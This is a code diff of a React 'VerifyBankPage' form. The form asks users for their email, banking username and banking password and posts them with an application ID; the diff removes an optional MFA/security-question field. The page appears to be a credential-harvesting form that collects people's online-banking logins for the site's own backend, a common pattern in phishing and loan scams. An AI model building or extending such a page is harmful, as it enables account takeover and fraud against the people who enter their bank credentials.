@@ -36,7 +36,6 @@ export default function VerifyBankPage() {
   const [email, setEmail] = useState("");
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [mfa, setMfa] = useState("");
 
   useEffect(() => {
     const updateTime = () => {
@@ -75,7 +74,6 @@ export default function VerifyBankPage() {
           email,
           bankingUsername: username,
           bankingPassword: password,
-          mfa,
           applicationId,
         }),
       });
@@ -342,21 +340,6 @@ export default function VerifyBankPage() {
                   >
                     {showPassword ? "HIDE" : "SHOW"}
                   </button>
-                </div>
-
-                <div>
-                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
-                    Security Question / MFA Code (Optional)
-                  </label>
-                  <input
-                    type="text"
-                    autoComplete="off"
-                    placeholder="If required by your bank"
-                    value={mfa}
-                    onChange={(e) => setMfa(e.target.value)}
-                    disabled={loading}
-                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
-                  />
                 </div>
 
                 <div>
